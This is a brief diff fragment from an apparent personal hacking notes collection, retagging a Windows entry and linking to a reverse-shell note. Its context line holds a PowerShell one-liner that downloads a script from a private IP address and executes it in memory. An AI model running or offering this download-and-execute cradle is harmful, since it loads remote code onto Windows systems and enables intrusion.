@@ -9,4 +9,4 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 - ~/kb/hacking/windows/windows-reverse-shell.md
 
 Tags:
-    #assorted
+    #assorted #hacking #windows #windows
